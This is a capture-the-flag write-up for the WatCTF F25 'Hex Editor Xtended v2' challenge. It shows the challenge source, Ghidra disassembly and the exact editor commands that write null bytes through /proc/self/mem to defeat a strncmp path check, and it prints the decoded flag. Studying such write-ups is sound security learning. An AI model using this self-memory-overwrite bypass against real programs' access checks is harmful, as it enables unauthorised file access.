---
title: "WatCTF F25 – Hex Editor Xtended v2: Bypassing Path Checks via /proc/self/mem"
date: 2025-09-11
toc: true
---

> *I made a hex editor inspired by ed, the standard editor.*
> *\[A harder version of hex-editor-xtended from WatCTF W25.]*

### TL;DR

The challenge prevents us from directly opening `/secret.txt` by checking with `strncmp`. However, we can open `/proc/self/mem` and overwrite the `/secret.txt` string stored in the program’s memory with null bytes. This bypasses the check, allowing us to open `/secret.txt` and dump the flag.

We are provided with these files:
![](https://github.com/user-attachments/assets/c6fe5d6a-1e13-47be-a91a-c9fd825d6438)

### Reversing the binary

Looking at the source code, the function `do_open_command()` compares the provided `user_path` against `/secret.txt` and blocks it if they match:

```c
void do_open_command(char *user_path) {
    if(realpath(user_path, path) == NULL) {
        perror("could not resolve path");
        clear_path();
        return;
    }
    if (startswith(path, "//")) {
        puts("path has to start with a single slash");
        clear_path();
        return;
    }
    if (strncmp(path, "/secret.txt", strlen("/secret.txt")) == 0) {
        puts("accessing /secret.txt not allowed");
        clear_path();
        return;
    }
...SNIP...
}
```

Disassembling in Ghidra, we see the check implemented with a call to `strncmp`. One of the operands (RSI) points to the global string `/secret.txt`:

```asm
                             LAB_0040182e                                    XREF[1]:     0040180e(j)  
        0040182e ba 0b 00        MOV        EDX,0xb
                 00 00
        00401833 48 8d 05        LEA        RAX,[s_/secret.txt_0049704e]                     = "/secret.txt"
                 14 58 09 00
        0040183a 48 89 c6        MOV        RSI=>s_/secret.txt_0049704e,RAX                  = "/secret.txt"
        0040183d 48 8d 05        LEA        RAX,[path]                                       = ??
                 bc 5a 0c 00
        00401844 48 89 c7        MOV        RDI=>path,RAX                                    = ??
        00401847 e8 24 f8        CALL       strncmp                                          int strncmp(char * __s1, char * 
                 ff ff
```

The global string lives at `0x49704e` in the `.rodata` section:

```
                             s_/secret.txt_0049704e                          XREF[2]:     do_open_command:00401833(*), 
                                                                                          do_open_command:0040183a(*)  
        0049704e 2f 73 65        ds         "/secret.txt"
                 63 72 65 
                 74 2e 74 
        0049705a 00              ??         00h

```

### Exploitation

We can’t open `/secret.txt` directly, but the program lets us open arbitrary files, including `/proc/self/mem`, which exposes its own memory. Since the check compares against the string at `0x49704e`, we can open `/proc/self/mem` and overwrite those bytes with `\x00`. Once the string is corrupted, the `strncmp` no longer matches, effectively removing the block. After that, opening `/secret.txt` succeeds and we can dump the contents with the editor’s `get` command.

```
$ ssh  hexed@challs.watctf.org -p 2022
Linux a5887148c597 6.11.0-1018-azure #18~24.04.1-Ubuntu SMP Sat Jun 28 04:46:03 UTC 2025 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Could not chdir to home directory /home/hexed: No such file or directory
Welcome to HEX (HEX Editor Xtended) v8.5 (bugs patched!)
Run 'help' for help
> open /proc/self/mem
> set 4812878 00
> set 4812879 00
> set 4812880 00
> open /secret.txt
> 
```

Now that we have opened `/secret.txt` successfully, we can use `get` to dump its contents:

```bash
> get 0
...
> get 48
```

Finally, converting the dumped hex values into ASCII gives the flag:

```bash
$ python3 -c "arr=['77','61','74','63','74','66','7b','68','30','70','33','66','75','6c','6c','79','5f','74','68','33','72','33','5f','77','34','73','6e','74','5f','34','6e','5f','75','6e','31','6e','74','33','6e','64','33','64','5f','61','67','34','31','6e','7d']; print(''.join(chr(int(x,16)) for x in arr))"

watctf{h0p3fully_th3r3_w4snt_4n_un1nt3nd3d_ag41n}
```

### Conclusion

By overwriting the /secret.txt string in memory through /proc/self/mem, the restriction check was bypassed, and we could simply open and read the flag.
